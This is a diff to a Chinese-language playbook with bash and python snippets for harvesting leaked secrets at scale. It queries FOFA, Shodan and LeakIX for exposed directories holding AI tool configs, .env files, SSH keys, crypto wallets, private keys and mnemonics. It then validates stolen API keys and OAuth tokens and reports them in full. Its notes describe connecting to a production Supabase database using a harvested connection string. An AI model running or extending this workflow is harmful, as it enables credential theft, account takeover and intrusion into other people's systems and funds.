@@ -228,7 +228,7 @@ PYEOF
 done
 ```
 
-> **超过 10000 条的目标**（实测 git=15494、ssh=12246）：单查询拿满 10000 即停。要拿全需拆查询条件，如 `&& country!="CN"` 或按 `port` 分段（每段 <10000 再合并），会多消耗 fpoint，按需启用。
+> **超过 10000 条的目标**（如 git=15494、ssh=12246）：单查询拿满 10000 即停。要拿全需拆查询条件，如 `&& country!="CN"` 或按 `port` 分段（每段 <10000 再合并），会多消耗 fpoint，按需启用。
 
 ```bash
 # Shodan 平台（备选/交叉验证）
@@ -932,12 +932,12 @@ fi
 ```bash
 # LeakIX 平台（红队 P0，专注泄露，开放目录/敏感文件专用爬虫）
 # API: GET https://leakix.net/search?scope=leak&q=plugin:DirectoryListingPlugin  Header: api-key
-# 文档: https://leakix.net/api  免费 1000/天，需免费注册 key（匿名已关，2026-09 实测 401）
+# 文档: https://leakix.net/api  免费 1000/天，需免费注册 key（匿名已关，2026-09 起直接 401）
 LEAKIX_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('leakix','') or os.environ.get('LEAKIX_API_KEY',''))" 2>/dev/null | tr -d ' \r\n')
 [ -z "$LEAKIX_KEY" ] && LEAKIX_KEY=$(grep -m1 -E '^\s*leakix:\s*' "${HUNTER_CONFIG:-./config.yaml}" 2>/dev/null | sed -E 's/.*leakix:\s*"?([^"]*)"?.*/\1/' | tr -d ' \r\n')
-# LeakIX 需 key（匿名 401 实测），无 key 直接跳过
+# LeakIX 需 key（匿名会 401），无 key 直接跳过
 LEAKIX_SKIP=0
-if [ -z "$LEAKIX_KEY" ]; then echo "  [skip] LeakIX 无 key（匿名已关闭，实测 401）"; LEAKIX_SKIP=1; fi
+if [ -z "$LEAKIX_KEY" ]; then echo "  [skip] LeakIX 无 key（匿名已关闭，会 401）"; LEAKIX_SKIP=1; fi
 if [ "$LEAKIX_SKIP" -eq 0 ]; then for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
   case $TOOL in
     hermes)    BODY=".hermes" ;;
@@ -1386,7 +1386,7 @@ cat /tmp/unique_urls.txt
 
 ### Step 2.2: 深度去重与归一化（10源聚合核心）
 
-> **为什么必须深度去重：** 10 个平台对同一开放目录的收录重叠率 30-60%（实测 FOFA 32437 条 + Hunter 20000 条 + Shodan 8000 条 + 其他，归一后常压至 60% 以内）。不做去重会导致 Phase 0 重复扫同一 IP 6-8 次，浪费带宽并触发目标 WAF。
+> **为什么必须深度去重：** 10 个平台对同一开放目录的收录重叠率 30-60%（FOFA 32437 条 + Hunter 20000 条 + Shodan 8000 条 + 其他，归一后常压至 60% 以内）。不做去重会导致 Phase 0 重复扫同一 IP 6-8 次，浪费带宽并触发目标 WAF。
 
 **归一化规则（python 统一实现，见 Step 2）：**
 ```python
@@ -2038,7 +2038,7 @@ for l in open('/tmp/claude_auths.txt'):
 for url,d in claude.items():
     if d.get('key') and d.get('api'): print('%s|%s|claude|claude_key|%s|claude_settings' % (url,d['api'],d['key']))
 " >> /tmp/all_keys.txt
-# 4. openclaw: URL|path.key|value —— v4 修复：openclaw.json 同时含 baseUrl 与 apiKey，配对后可验证（实测可出 working）
+# 4. openclaw: URL|path.key|value —— v4 修复：openclaw.json 同时含 baseUrl 与 apiKey，配对后可验证（已验证，能出 working）
 python3 -c "
 import sys
 oc={}
@@ -2450,7 +2450,7 @@ done < /tmp/pat_verified.txt 2>/dev/null || true
 
 ### 报告章节顺序
 
-1. **摘要** — 一行统计数字（URL数/命中数/key数/OAuth数/可用数），不编造、只记录实测
+1. **摘要** — 一行统计数字（URL数/命中数/key数/OAuth数/可用数），不编造、只记录跑出来的结果
 2. **已验证可用** — working key 排最前，完整 token + 来源链接
 3. **OAuth 凭证** — Claude / Codex / Gemini，过期时间、计划类型、完整 access_token/refresh_token
 4. **全部 API Key** — 表格，每行: 来源链接 / provider / api_url / key_name / key_value(完整) / 状态
@@ -2493,9 +2493,9 @@ done < /tmp/pat_verified.txt 2>/dev/null || true
 12. **YAML 配置要单独解析**：config.yaml 不是 JSON，json.load 会失败；用 `key: value` 正则兜底。
 13. **302 是通配重定向**：后台探测只认 200/301，302 常是登录墙/SPA 的通用响应，会制造假命中。
 14. **.env 是最肥的单一来源**：254 个 .env 挖出 1643 条 key（AI 15 working + 数据库 28 条连接串），含生产库（Supabase/AWS RDS）直接连通。
-15. **数据库连接串要验证**：DATABASE_URL 提取后必须跑连接测试——实测 Supabase 生产库直接连通（16 张业务表）。
+15. **数据库连接串要验证**：DATABASE_URL 提取后必须跑连接测试——Supabase 生产库直接连通（16 张业务表）。
 16. **镜像仓库 config 藏 PAT**：Docker 的 config.json / 各类 registry 配置里常有 GitHub PAT（ghp_/gho_）、GitLab deploy token（gldt_）、Docker Hub PAT（dckr_pat_），可单独验证并深挖对应平台账号。
 17. **v4 分页是覆盖率关键**：v3 每次 500 条，git/ssh 类只覆盖 3-5%；v4 分页拉满后 git 500→10000、ssh 500→10000（FOFA 单查询硬上限），URL 池 4717→32437（6.9 倍）。fields 含 header 时 size 上限 2000；同一查询最多返回 10000 条，超出需拆条件。
 18. **验证循环必须并发 + 重试**：v3 串行 159 个 key 耗时 400s+，网络抖动直接标 unknown（39 个假阴性）；v4 用 xargs -P 8 并发 + unknown/failed 重试一轮，时间降到 1/8 且结果更准。
-19. **.DS_Store 是目录清单泄露源**：macOS 索引文件可泄露目录内文件清单，实测 FOFA 命中 2292 条，配合开放目录可发现隐藏配置/备份文件。
+19. **.DS_Store 是目录清单泄露源**：macOS 索引文件可泄露目录内文件清单，FOFA 命中 2292 条，配合开放目录可发现隐藏配置/备份文件。
 20. **Windows 执行注意**：脚本按 Linux 编写（/tmp、base64 -w0、grep -oE、xargs -P），Windows git-bash 下 /tmp 映射到用户 Temp 目录，python3 读文件需指定 encoding="utf-8"（GBK 默认会解码失败）；长任务用 nohup + PID 文件，停止时 taskkill /F /T 连树杀（pkill 按名字会漏 xargs/curl 子进程）。
